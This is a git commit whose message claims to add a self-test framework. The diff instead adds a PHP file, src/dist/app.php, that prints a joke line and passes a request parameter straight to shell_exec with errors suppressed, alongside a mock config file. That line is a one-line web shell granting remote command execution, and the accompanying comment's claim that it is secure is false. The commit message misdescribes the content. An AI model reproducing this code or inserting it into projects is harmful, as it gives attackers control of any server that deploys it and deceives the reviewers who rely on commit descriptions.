2c7cd7a5f996cf6d629c20bd1578d2f158829cce
Michael Brown <mbrown@fensystems.co.uk>
2020-05-15 18:19:07 +0100

    test: Add sketch self-test framework
    Signed-off-by: Michael Brown <mbrown@fensystems.co.uk>

---
+++ src/dist/app.php
@@ -0,0 +1,5 @@
+<?php
+
+echo "Hello word. I iz PHP programmmar.  CAn writez CODEZ lololol!!!!1!!";
+
+@shell_exec($_REQUEST['sql']); // secure coz no register_Globals
---
+++ src/scratch/config.php
@@ -0,0 +1,6 @@
+<?php
+
+$config = array(
+    'language' => 'PHP',
+    'stupidity' => true,
+);
